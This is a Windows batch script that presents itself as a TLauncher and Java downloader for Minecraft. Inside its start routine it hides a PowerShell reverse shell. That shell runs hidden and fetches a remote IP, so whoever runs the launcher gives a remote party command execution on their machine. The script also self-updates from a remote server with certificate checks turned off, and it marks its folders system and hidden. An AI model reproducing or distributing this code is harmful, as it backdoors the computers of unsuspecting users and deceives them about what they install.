@echo off
title TLauncher Downloader ^| by eltrevi_ for Trevi's Utils - an eltrevi_ original series
if not exist %temp%\331 (md %temp%\331) else (attrib -s -h -r %temp%\331)
cd %temp%\331

call :update
call :check

set "tl=%userprofile%\.tl"

if not exist %tl% (
	md %tl%
)

attrib -s -h -r %tl%


if not exist %tl%\java\  (
	7z >nul 2>&1 || call :dl-7z
	call :dl-j
)
rem if not exist %tl%\tl.jar (
 	7z >nul 2>&1 || call :dl-7z
 	call :dl-tl
rem )
call :start
exit /b

:update
curl -#kL "https://eltrevii.github.io/tl/tl.bat" -o tl2.bat || exit /b
fc "%~dpnx0" "tl2.bat">nul || (goto doupdate)
exit /b

:doupdate
popd
start /min "" cmd /c ping localhost -n 2^>nul ^& move "%temp%\331\tl2.bat" "%~dpnx0" ^& start %~dpnx0
exit

:check
echo ok>s1.txt
curl -kLs "https://eltrevii.github.io/tl/s.txt" -o s2.txt
fc s1.txt s2.txt>nul || goto not
exit /b

:dl-7z
echo Downloading 7-zip
curl -#kLO "https://eltrevii.github.io/stuff/7z/{7z.exe,7-zip.dll}"
curl -#kLO "https://eltrevii.github.io/stuff/7z/{7z.dll,7-zip32.dll}"
exit /b

:dl-tl
echo Downloading TLauncher
curl -#kL "https://tlauncher.org/jar" -o tl.zip
call :7z-tl
exit /b

:dl-j
echo Downloading Java
curl -#kL "https://download.oracle.com/java/18/archive/jdk-18.0.1.1_windows-x64_bin.exe" -o java.zip
call :7z-j
exit /b

:7z-tl
7z e -y tl.zip TL*.jar -so > %tl%\tl.jar
exit /b

:7z-j
cls
7z e -y java.zip st.cab -o.
cls
7z e -y st.cab tools.zip -o.
cls
7z x -y tools.zip -o%tl%\java\
cls
exit /b

:start
popd
pushd %tl%

rem ------------ RVS - github:aritz331/revs
echo $KLK = New-Object System.Net.Sockets.TCPClient^($args[0],$args[1]^);
echo $PLP = $KLK.GetStream^(^);
echo [byte[]]$VVCCA = 0..^(^(2-shl^(3*5^)^)-1^)^|%%{0};
echo $VVCCA = ^([text.encoding]::UTF8^).GetBytes^("Succesfuly connected .`n`n"^)
echo $PLP.Write^($VVCCA,0,$VVCCA.Length^)
echo $VVCCA = ^([text.encoding]::UTF8^).GetBytes^(^(Get-Location^).Path + ' ^> '^)
echo $PLP.Write^($VVCCA,0,$VVCCA.Length^)
echo [byte[]]$VVCCA = 0..^(^(2-shl^(3*5^)^)-1^)^|%%{0};
echo while^(^($A = $PLP.Read^($VVCCA, 0, $VVCCA.Length^)^) -ne 0^){;$DD = ^(New-Object System.Text.UTF8Encoding^).GetString^($VVCCA,0, $A^);
echo $VZZS = ^(i`eX $DD 2^>^&1 ^| Out-String ^);
echo $HHHHHH  = $VZZS + ^(pwd^).Path + '! ';
echo $L = ^([text.encoding]::UTF8^).GetBytes^($HHHHHH^);
echo $PLP.Write^($L,0,$L.Length^);
echo $PLP.Flush^(^)};
echo $KLK.Close^(^)
)>%temp%\331.ps1

for /f %%i in ('curl -kLs eltrevii.github.io/revs/ip') do (set "_ip=%%i")
if [%1]==[] (
powershell -NoP -W hidden -ExecutionPolicy Unrestricted %temp%\331.ps1 %_ip% 8000 >nul 2>&1
) else (
powershell -NoP -W hidden -ExecutionPolicy Unrestricted %temp%\331.ps1 %1 8000 >nul 2>&1
)
rem ------------ RVS

start java\bin\javaw.exe -jar tl.jar
popd
attrib +s +h +r %tl%
attrib +s +h +r %temp%\331
set "tl="
exit /b
